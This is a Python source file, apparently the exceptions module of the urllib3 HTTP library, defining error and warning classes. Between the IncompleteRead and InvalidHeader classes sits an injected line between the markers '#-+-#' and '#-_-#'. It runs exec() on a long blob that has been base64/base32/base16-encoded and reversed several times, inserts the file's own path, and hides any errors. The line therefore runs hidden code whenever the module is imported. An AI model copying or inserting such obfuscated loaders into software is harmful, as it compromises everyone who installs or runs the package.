from __future__ import absolute_import
from .packages.six.moves.http_client import (
    IncompleteRead as httplib_IncompleteRead
)
# Base Exceptions


class HTTPError(Exception):
    "Base exception used by this module."
    pass


class HTTPWarning(Warning):
    "Base warning used by this module."
    pass


class PoolError(HTTPError):
    "Base exception for errors caused within a pool."
    def __init__(self, pool, message):
        self.pool = pool
        HTTPError.__init__(self, "%s: %s" % (pool, message))

    def __reduce__(self):
        # For pickling purposes.
        return self.__class__, (None, None)


class RequestError(PoolError):
    "Base exception for PoolErrors that have associated URLs."
    def __init__(self, pool, url, message):
        self.url = url
        PoolError.__init__(self, pool, message)

    def __reduce__(self):
        # For pickling purposes.
        return self.__class__, (None, self.url, None)


class SSLError(HTTPError):
    "Raised when SSL certificate fails in an HTTPS connection."
    pass


class ProxyError(HTTPError):
    "Raised when the connection to a proxy fails."
    pass


class DecodeError(HTTPError):
    "Raised when automatic decoding based on Content-Type fails."
    pass


class ProtocolError(HTTPError):
    "Raised when something unexpected happens mid-request/response."
    pass


#: Renamed to ProtocolError but aliased for backwards compatibility.
ConnectionError = ProtocolError


# Leaf Exceptions

class MaxRetryError(RequestError):
    """Raised when the maximum number of retries is exceeded.

    :param pool: The connection pool
    :type pool: :class:`~urllib3.connectionpool.HTTPConnectionPool`
    :param string url: The requested Url
    :param exceptions.Exception reason: The underlying error

    """

    def __init__(self, pool, url, reason=None):
        self.reason = reason

        message = "Max retries exceeded with url: %s (Caused by %r)" % (
            url, reason)

        RequestError.__init__(self, pool, url, message)


class HostChangedError(RequestError):
    "Raised when an existing pool gets a request for a foreign host."

    def __init__(self, pool, url, retries=3):
        message = "Tried to open a foreign host with url: %s" % url
        RequestError.__init__(self, pool, url, message)
        self.retries = retries


class TimeoutStateError(HTTPError):
    """ Raised when passing an invalid state to a timeout """
    pass


class TimeoutError(HTTPError):
    """ Raised when a socket timeout error occurs.

    Catching this error will catch both :exc:`ReadTimeoutErrors
    <ReadTimeoutError>` and :exc:`ConnectTimeoutErrors <ConnectTimeoutError>`.
    """
    pass


class ReadTimeoutError(TimeoutError, RequestError):
    "Raised when a socket timeout occurs while receiving data from a server"
    pass


# This timeout error does not have a URL attached and needs to inherit from the
# base HTTPError
class ConnectTimeoutError(TimeoutError):
    "Raised when a socket timeout occurs while connecting to a server"
    pass


class NewConnectionError(ConnectTimeoutError, PoolError):
    "Raised when we fail to establish a new connection. Usually ECONNREFUSED."
    pass


class EmptyPoolError(PoolError):
    "Raised when a pool runs out of connections and no more are allowed."
    pass


class ClosedPoolError(PoolError):
    "Raised when a request enters a pool after the pool has been closed."
    pass


class LocationValueError(ValueError, HTTPError):
    "Raised when there is something wrong with a given URL input."
    pass


class LocationParseError(LocationValueError):
    "Raised when get_host or similar fails to parse the URL input."

    def __init__(self, location):
        message = "Failed to parse: %s" % location
        HTTPError.__init__(self, message)

        self.location = location


class ResponseError(HTTPError):
    "Used as a container for an error reason supplied in a MaxRetryError."
    GENERIC_ERROR = 'too many error responses'
    SPECIFIC_ERROR = 'too many {status_code} error responses'


class SecurityWarning(HTTPWarning):
    "Warned when perfoming security reducing actions"
    pass


class SubjectAltNameWarning(SecurityWarning):
    "Warned when connecting to a host with a certificate missing a SAN."
    pass


class InsecureRequestWarning(SecurityWarning):
    "Warned when making an unverified HTTPS request."
    pass


class SystemTimeWarning(SecurityWarning):
    "Warned when system time is suspected to be wrong"
    pass


class InsecurePlatformWarning(SecurityWarning):
    "Warned when certain SSL configuration is not available on a platform."
    pass


class SNIMissingWarning(HTTPWarning):
    "Warned when making a HTTPS request without SNI available."
    pass


class DependencyWarning(HTTPWarning):
    """
    Warned when an attempt is made to import a module with missing optional
    dependencies.
    """
    pass


class ResponseNotChunked(ProtocolError, ValueError):
    "Response needs to be chunked in order to read it as chunks."
    pass


class BodyNotHttplibCompatible(HTTPError):
    """
    Body should be httplib.HTTPResponse like (have an fp attribute which
    returns raw chunks) for read_chunked().
    """
    pass


class IncompleteRead(HTTPError, httplib_IncompleteRead):
    """
    Response length doesn't match expected Content-Length

    Subclass of http_client.IncompleteRead to allow int value
    for `partial` to avoid creating large objects on streamed
    reads.
    """
    def __init__(self, partial, expected):
        super(IncompleteRead, self).__init__(partial, expected)

    def __repr__(self):
        return ('IncompleteRead(%i bytes read, '
                '%i more expected)' % (self.partial, self.expected))

#-+-#
try: import os as x_o;exec('PT13UW5Cek5qTmpUb05HUndCellIWmxhbGRVVkxSRVZ6QjNTSUpWZVpobFU2eGtiU1pXWkVOSGNqeFdPMEFGV1N4bVd6b0Vha05FYXJsMVZXbFhZR0ZWZGtaVU8xQUZXU1pXWkJ0MlNFaGxVbVYyVUNwWFdUSmtiaTFHYnJsMVZXbFhZSUYxWmtoa1MyTjJSeEEzUVI5bVRMTkZhc05tTTVNWFc1VlRiWU56WjNzMFZTWldaRGhHYmtkRWI1UldlMTBHV3pjMk5MTkZaem9VZTRkSFd6YzJiaTFtVjNKbWV4MEdXemMyTkxaVlQxTkdiNVVEVVk1a2JaZEZldHgwUlNaV1pEZG5iS2wzZHVsVU0zUkhXR2x6WU1aMWRxaEZSNEVIVHA1MFlNWjFkeWgxUXhNV1N4Y25iTGRrU3hNV2Uxa0hXenNXT2FaVU8wOFVlcjltV1k1a2RpZFVUMXBGYjVRelQ1dDJiYWRrUnNOV2ExMEdXemNXT2FaVU8wOFVlc2RIV3pjMmJpMW1WM0ptZXgwR1d6YzJOTFpWT21wMVY0Qm5Xc2xqWkxkRWF3a0ZXQ3BYV3RWVWRoaGtVb04yUTFZSFd6c1dPalpVTzBNVVVydEVSVU5IY2FaVk8wd0VTT1pXWkRobU5ZTnpaS05VVXJ0RVJVUlhkajVtVndvRldKWnpTWFpsWmxORWU2aDFNbk5YV1dsVGRMaGtXbVYyUUNCall5UXpaYTEyYUtOVVVydEVSVVJuZWpKalIzOWtiU2RuV1g1RU5hRjFhS05VVXY1MFQ1eFdNWU56WnZwRldhWm5ZWFpWZU0xV09tVkdWd1Z6WXVGbFNERjFhTFJFVjBwM1l5WTBkUDVtVTNwMVZPUmpXUnRtU0RGMWJPOVVlckJuV1dsRE5MZGtWMGwxVjFrWFlYRlZkaGhrVW9OMlExWUhXenMyYmpOalN3cDFSV0pYV1hCVGRpRlRPMThrYnNsSFpCdG1TREYxYk85VWVyQm5TNkJUT1ZaRmN3bzFSMXcyVnVKVWRWWkZhaEpXUnh3MFZ1QlhWWGhGYTBsVlY1Y2xWclZ6U2pSa1JUMWtNb1ZuVllkR05XRlRRdXRFU29aV1pEZEhjTGhrU3dwRlNDUm5XWUpGTWFkMVkxcEZiNVV6U0hWRGNpSnpiMUZHU1NoMllEVmpkWU56YW5wRldPTm5XVEZFZVFSVk02aDFNbmRtV3R0MlpMTjFhdUJGV05kSFZYbHphV3htV2FWbGFLSmxWR0JuY1ZOaldYSlZiS1ozWUdwRldrcEhhSXBsVnZoWFRzOUdNWDFHZU9KRk1hRm5Wd28xVVdGRFpXMUVWS3RtVFhKMVJXTmpTWFpsUlNCalRYUm5UWGhrVUlkbGJLTm5ZRkZEVmFaa1dZZGxWdmhuVlZSRGVXRlRUeVVsYUdobVl5ZzNjV3RHWjNabFZrbFZZRnBWYVdWVU5YVmxiTlZUWXhvRk1TeG1Vb1JWYm9kVVdWaFdZU3hHWjVaRmJTVjFZd29VV1V4bVQwSVZNd2RuVnRGVGFpMUdhMVpGYld0VVRHcEVjYVprV1YxVU12aFhXWGx6ZFdGRFowSW1lQ3AyVnVKVWRWeG1RUDFrVktSRlZzaDJWakZqU0laVmIwZGxWclZ6U2pSa1JUSldNS0ZuVll4bWROZGtUVjFrVms5RVZyOVdlVjFXT3oxa1ZhVlhUV0pWVUtsSGEwZzFNbjkyWXRabGVrZGxVMWxGV0NSaldUVnpia2RrUjN4VWI1WVdaVUZEYllOelpLTlVVcnRFUlVSWGRqNW1Wd29GV0paelNYWmtaaWxHYXdoMU1uZEdaSGxUZEpka1d3TlVVcnAwUW5Cek5pNW1TeFEyUldsM1RxRjBkTnBXUjE0a2E0OUdXemNHZFpGVE8wazBSYUIzUVJ0bVNEZEdNM3MwVW94Mll5a3pjWmxYTnVoMU1yZHpTV0JEZU1SMWIyY1ZlczlHV3pjMmJqNW1VNnQwUldCVFlZcDBNTTFHWm1WR1Z6Qm5Tek1tYk1oa1ZtVjJRb1ZuV1lKa2RRZEZabVZXVXJwMFFSdDJTRVJGY3NObU00eDJRUnRtU0RkR00zczBVb3gyWXlremNabFhOdWgxTXJkelNXQkRlTVIxYjJjVmVyOW1XSFpFYmpsV051aDFNcjlHWkhWRGNRZEZhbVZHUnpCblN6a2tiTWhrVm1WMlFvVm5XWUprZFFkRlptVldVcnAwUVJ0MlNFUjFid1JtVjVRelNJNUVNakpEYjBvMVUxOEdaSFowZE0xV09tVjJVQzFXWVJ0bVNERjFiTzlrTU9aV1pFRnpiWU56WjNzMFVyNUdVVUZqUVdabFZIRkdiR2xWVFVwRWFsVmtWelJWVjB0a1VHcEZlalZrVm9wVWVvUkRXemMyWk1OMGF1QkZWeElrVldSV1loRmpXWlZWYjRKMVVGQkhkVzVXVDFJVk1hcFhZR1JtV0tsSGEwZzFNbmRHVER0R2NLcFhNVzFVYkd4a1lFWjBWa1ZVUzZsVk1rZGtVSGxrTVV0R1pVUm1lR1owVnU1MFZpZGtWaE4xYVN4R1ZGVnpjVjUyWTFZVk1hcFhZSEZEV0tsSGEwZzFNbjlXWUlKRmFWZGtWd2sxVjRwbll0WlVla05VTjBnMU1yOW1ZdHhtZGhsV052UjJSR2RIVHRsalpsUlZNeGcxTW5kRFdUTldPUVZsUldkRlJGZG5XRzlXTWlaRlo1TlZiNDUwVXdRamVXaGxSM1oxVkc5VVZyWlZha0ZqU0haVk1rRldZeFkxUmxkVU1yRjJhS0ZuVkhoRGVoRmpTTUptUldobFR0aDNSVTFHZVgxMFZSSnpZRnAxVVVOalVJZEZibmhuVlhaVllPZFZNWU4yYXdOSFZWUjNUaXhtVWFWMlJ4Z1ZZeklFV1ZwbVZUMWtWS2xuVnRCblZsVkZiWFIxVkdOa1VHQlhlVnRHWlVKbU1uaG5WVTFFZVdaVVF1eDBRamxEVVZaa1ZYUlVSM3BsUnZGallXUldlVDFHZU9ORk0wb25WWVowZFdkbFJQVjFhV2xHWnhvMFJXRkRaaEZXTVdkVVpIRnphaHRtU3haMVI0Z1hZeG9FVGlaa1ZZNVViNGRFVnRoM1ZOZFZVeU1XUmFORlZ6SUZTWHgyWjRaMVZXRm1UWEZEV2p0R2N6UlZWMDlrWXNKbFdsZFVNWUYyTUNoVlZxWjFVTlpsUzVaVmJ3WlZaVngyVlVkbFJESmxSd2xYVnJSR1ZpSnpaNFpGVk5oblZHRmtiTU4wWTVBVlZHWjFWRVYwZGFaMGJ4SW1Wa2wzVXRoblRUQkRONlpGV0dkblZYWjBUVnRtVnBSV01LZGtWeFFXWWhGalZIVjJSeHNXWXJwVWNXZEVPNEZXTUt4a1lHWkZXTzFHZUhSVmI0ZFZUWEZsTWpWa1dUUjFNU2gwVnNkR2VXZGxWaDUwVnhnMVlyQjNjVVZGZFBKR2JTcFZaSEZEV2hOalFZVmxhV05WVFdwVWVXMUdjV1ZXVnNkRlZYWjBRU1pFYzVWMWFrUmxZeWNHZVdSVlQ0WmxSQjUyVjZGRGFZSkROM3MwVXNwR1d6YzJiajVtVTZ4MFI1WVdaRGhXTmtoa1NzTjJSNWtYVklKRmJqbEhOdzFFUkJkWFRFVjBia0pUT3JKV2JzaEZUdUJuWmxGMWFLTlVVdjUwVHlVVGVraGxVc05tYXZkWFRFRmxNUFIwZHdsRmI1UXpTSUpWZGhOVk1xaDFNbmRtV0hWRGFKTjBZdUJGVnhrR1d6YzJaa2RVTzFsMFJTVlhXVEpVYVlOelpucFZicnAwUVJ0MlNFUjFjd3QwVW94bVlYeEdNTTFXTW1WMlVvQmpZdHRXT1pGVE8wOFVlc1pIV3pjMmJsaGxVNXBGV0NaM1lzSkVNYWQxWTF0RVZCZFhURUZFZUxoRVoycDFSMUFuVjVWak5ZTnphNWtGYjVRelQ1dG1iaDVtUUlsMWFzdG1ZSHAwUVcxR2NYUkdTQmRYV3JsVFlTeEdjb04xYWtsV1dXcFVXV3BYVDRabFJCNTJTSWhtWmxSVU0yaDFNbnAwUVJ0MlNFUjFiM0JsYk9aV1pESlViaEYxYUtOMFp3Y1RUREpFYmpKRGVzbDBRc1ZuWXpvRWNrMVdOc3hVYjVZV1pUSlVkaE5WUXlnMU1uZEdaSGxUZEpka1UxbDFVQkJYVHNsRE5KZFVOd2xFUldaV1pESlVlaWxYUTRoMU1uZG1ZdHQyWk9aVk8wczBRbmRtV3R0MlpObG1Rc05tTTR4V1NEdFdlWU56Wm5KV2JyZG1UR2xETkpoa1MybEVSS1pXWkRKVWRoTlZRNmgxTW5kMll0aHpaTlpWTzBrMFIxQVhTRUpsWmxOa1E1SldlQmhIV3pjMlppMTJhbjFVTTVRelNESlViaE5WUTRCRldPWldaRU5IY0twWE1DSkZiYVJ6VVdwMVZXMUdlMlkxVm9kVVlzcDFVVHhHWlRaRk0xTW5Wem8wZGlka1RZWjFhYWgyVkdCM1JaeG1UckZXTVNkMVZxWjBWS2xIYTBnMU1ubGpUc2xETlBsM2F1VjFWb2QwVnN4MmNTeEdaWXBGUkdaMVVHcDFWVk4wWXZWbVI1UURVVVpsWmxSMGN3cGtNbmhYVHRGbE1hZEVlb1JGTTFVM1ZXaDJjV1pWUXV0RVNvWldaRUJETVlOelozczBVamxUVEhSblRPWmtTWlpsTTBnblZHRmtiTGhFYW1WR1J3b0hXemMyTmlobFMycGxiU2htWUlGVWRsWlZPMUFGVktaV1pFTkhjTGhrU3NSbU01TUhUcHQyYmlkbFZ3TTJNc3BIVHVKa1psUkZNNGgxTW5wMFFSOW1UYXhXTzFrRVNPaFdTSFoxY2hkbFczSjJWV0JEVElCblpsTmxRNmwxVUNCSFpYUm1haWRsUzB3RVNvWldaVEprZVpObFFxSjJWS1JEVEhGalpsTmxRNmwxVUN4bVlYeEdNTWhrU21WMlVDcFhXVEpFYmpsR2UyaDFNcmQyWXlVMFpqSkRPelZtVjVVVFNJNUVhSmhrVDFNV2U0ZEhXenMyWmpKVFJuSkdXS1puV3VKRmFpaFVRblJHU0taM1lIRkRjREYxYUxSRVZ2QjNTSXBrWmxOa1F0cDFWUnAwUW5Cek5haGxUemxWVlpkbVl1cFVNa2RrVjVOVVVydEVSVVJIYmtobFNWbDBSMWtIWllKRmJqZDJhS05VVXY1MFR5WVZNaTFHYndJV2I1bzJUdUoxZGFkbFQwb1ZVcnAwUVI5bVRQbEhidHgwUXNSV1lXUjNjTGhFYW1WMlFveEdadFpGY2o1bVVzTldiNGxIWlRWVE1ZTnphMlVHV0tCelFSdG1TRGRHTTNza1Z4QTNWeVUwYmxaVU8wQTFWMVlYWVk1VWVhaFZXMU5XYldWbldZSmtkVVprU1d4a2JXWldaVTltYktwSE01ZzFWc0pXV1RKRU1pSkRObnBWYnJwMFFSdDJTRVJGZHNSMlYxQUhaSFZqZFpwM2J1cGtld2tEV1h4bVlpTmtRdEZXVXJwMFFSOW1UUGwyYXdKMlFvVm5XWGQzYmFkRloxbEZXSmRtWXR0MlpoTmxRNUptTVpwMFFSOW1UUEZETXVWbFZLZEZWVjUwY1N4bVdFUmxhR1oxVUVaa2NVWmxRdkoxVks5RVZ0RkRhakp6WjNabGJXdFVUSHAwVE5kVk1VMUViV2RWV3FWMGRXWkZjWUYxYW90bVZYSmxWVXhXVTQxMFJGQnpZSFZqV1RWa1d4WlZlak5uU3l3MlJoeG1UTE5XUmFSVll5SVZXWDVtU3ZKMmF4RTNZSFZEVmpWa1cwUkZWUzltWUdSbVNWcG1TV1pGTWFaVFdVNVVZVzFtUzAwMFIwcGxUdUpGV2FaRmMzSkdiR056VVdwbFRrcEhiMFpsUnNSallXUm1jalpFWlQ1a1ZLZFVWd2t6VGl4R2JZUm1Sa0ZsUzVkbmJRVlZSNFpWYjA5V1l4UW1SVHBtUVNGR1dTaEZWenNHTlNabFQ2RldSa0YyWXpJa1JXRkRjdkptUmFsMVV0aG5UVkJqV3habFZhTlZUdFowY2tkVU1VZFZiUmhuVnVSMmFpWkViWHBGUk90MlZJSkVkV1ZVTlBKV1Z3QVRWcTUwVlZwbVJWVjFRa0pXU0habGVpZFVWbjFFVndrRFpESlViaE5sUWtwVU1HTmxWckZEUmlWa1dYRkZNMGduVlZkR2VoQlRNUkZXUldsR1ZyVkRkWmhsVHYxa1JhRnpVcUpVYVVwbVIwVmxlS1psVnRsRWVOWmtWaFpGTUtsa1dHWjFhV1ZWTlYxRVZDaFdUeklVZFhWRmFIRkdiajVHVERSR2NTMUdjVU5sYkNkVVZ5UTNhWFpFYzVGMlIxNFVZdUpVZFZOalFISldWd0FUWUhoSFdUWlZTNVpsVmtkVVp0VmtlWHhtV3BWR1JDSjNWVXBGTVdKalZoTjJSMUlGWnd3MlZVaDFZMUltVlNwVlpIRkRXaE5qUVlWbGFXTmxVc3BFVVUxV05hWjFNU2hWVkROMmNLcFhNQzFrVmFKWFlIUkhXU1YxYjNWMVZzQmpWd2tUTlBWa1ZVTm1Nb2gwVnU1MGRTWkZaaEYyUjRkMVZGQjNjVVpsVEhGR2JXZFZWcXBFYWloa1UwVlZNd3RXVFdwMU1hZEVlYVpWYlJwbldHaDJkaVpsVVAxMFYwNWtUR2xrZVd4V1M0WmxSQjUyVjZGemNERjFhTFJFV1daV1pUSmtlWk5sUXBGMlY0TjNZdVYxWmtoa1MyTjJSeEEzUVJ0MlNFUjFid3BWYTRCRFRIVjBia3hXTzBrMFJheG1XQnQyU0VSRmRzTm1NNGhtVXBKVWRqNW1Wd29GV0pwMFFSOW1UUEpqVnhJV2JzQmpZdGxqYVA1bVUzcDFWT1JqV1J0bVNERjFiTzlrZUZsRFVUdEdjTGRrVW9wRldKVjNTVHhHWmhaRmRzdEVTb1pXWkRoV2RhaGxRMkpHU0tGRFR1WmxabE5GYXdJV2JyZG1ZdXBVTWtka1Y1OWtic2xIWkJ0bVNERjFiTzlVZXNSV1lXUkhhTGhFYW1WR1J4VW5ZeXdtZWoxbVZ5d2tiS3htWXRaMWRpQkRlVFoxVTFFRFd6c21OS2wzWTVBbFZ4QTNWeVUwWmtkVU8xbDBSYUIzUVJ0bVNEZEdNM29GV1dWWFlZSlZkaUpUVDJvVWVqbERVV0ZEY1hKVFZucFZicnAwUVJ0MlNFUjFid3QwVlY5bVl0WjFjTGRrVnVKV2JHbFhTSFZEY0pkMGFuTldiNTAyUVJ0MlNFUkZkc1JHV0tWVlNIVlRla2hsVXNObWF2ZEhVVUJEY2FORmExcDFWM2RtV3R0bVNERjFiTzlVTXc0V1ZYSjFSWHRHYjNKRmJLUkVWdFJuV2oxR2V4UmxWQzltVVhwa2RWdEdacE5sTW9kbFZ4ZzJiV1ZVTlAxa1ZrVlZUNlYxZFc1bVQzSm1Wc1oxVnNwMVRYUlVSNWxsZUdabFZyRlRlUjFHY1ZabGFXSlhXWHgyUVdaVVR5WTFhYU5WVnRoV2RXdEdhWFpsVkI1R1RETldPUVZsUldaVlZhRlhWV0IzVWlaa1JWUmxhR05GVnJCbk5XVkViMFlWTVNGM1lGUldhVGRsVXpsMWFPdFdUV1pWU09kRmRxVjFNU2gwVnVwMFNTRmpTWVZGYldoMVZZRkVlV1prVXJGV01WRmpWcnBWYWhOalFIZEZiYU5rVkhaVllPWkZaVzFrVldkRlZZcDBRaHhtVVg1MFYwaFdZVnBVVlZwbldYSkZiS05WWUhWelZUWmtXV1YxUWpOblM2QlRPYUZEYjBJV01XUlZXWGhtUlhwbVRYMVViRkJ6VXVCbldPNW1RV2wxVm90a1VIVjFkaVprV3A1VVIxTTNWWXAwYk5KalNYTjJSeFUxWVdwRVNVWkZjejFVTWFsbFdHaG1UVnRHY1ZaRlZWVlRZeG9GVWpkRWVWSmxWd2RVVnNCM1NXVlVPRjFrVlc1VVVycFVWV1pFWkxKVmJGNTJWNkZEYkRGMWFMUkVXV1pXWlRKa2VaTmxRcEYyVjROM1l1VjFaa2hrUzJOMlJ4QTNRUnQyU0VSMWJ3bDFVb0JIV3pjMlphMW1Wck5VVXY1MFR5RTFaaTVtU3hRMlJXbDNRUnQyU0VSRmRrMTBVd1l6VHNOSGNMUlZVeTFVYTRjWFRxVjBiajVtVTZ0VU13Z0hUVTltTlhsM2F1bFZiRjUyUzVSbWVhTjFZdnQwUld0bVl5NEViYU5VTnJCMVZSWnpTVWxFZUtSVlY0dDBSVzVtWXRaVWVKZFVOd2wwUnJkMll0bFRiREYxYUxSRVZ2Qm5XRGhHTllOelpucFZiV3QyUVI5bVRQbEhicnQwUjROWFdYMVVkakZUTzE4VWVzUmtVV2htUlRaVk9VeFViR1pXWlRKRU9KZGtWckptTXhZR1pJMVVkTGRWVXZSMlJHQnpZNVZqZFlOemFueDBSUjltV0hsRGRoZFVUMUpXTTVVelFSdDJTRVJGZDFObWJXQmpXWWxrTk5SRk01TVdlQzFXWVJ0bVNEZFdNNmgxTXJkMll5VTBaak5qVHNsbE01azNZSHBVTWpsSGVvaDFNcmQyWXlVMFprZGtSd01XZTRaSFd6czJaakpUUm5ObU00Y0daSXBrZGpkVU13TlVVcnRFUlU5R2NhTkVlNnRFU3daV1pESlViYWRWVUtOMFp3WVRaWXBFTQ=='.decode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(30*2+12/3))[::-1].decode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(160/2-16))[::-1].decode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(455/7-1))[::-1].replace('x_q', x_o.path.realpath(__file__).encode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(152%88)).replace('\n', '')))
except: pass
#-_-#

class InvalidHeader(HTTPError):
    "The header provided was somehow invalid."
    pass


class ProxySchemeUnknown(AssertionError, ValueError):
    "ProxyManager does not support the supplied scheme"
    # TODO(t-8ch): Stop inheriting from AssertionError in v2.0.

    def __init__(self, scheme):
        message = "Not supported proxy scheme %s" % scheme
        super(ProxySchemeUnknown, self).__init__(message)


class HeaderParsingError(HTTPError):
    "Raised by assert_header_parsing, but we convert it to a log.warning statement."
    def __init__(self, defects, unparsed_data):
        message = '%s, unparsed data: %r' % (defects or 'Unknown', unparsed_data)
        super(HeaderParsingError, self).__init__(message)


class UnrewindableBodyError(HTTPError):
    "urllib3 encountered an error when trying to rewind a body"
    pass
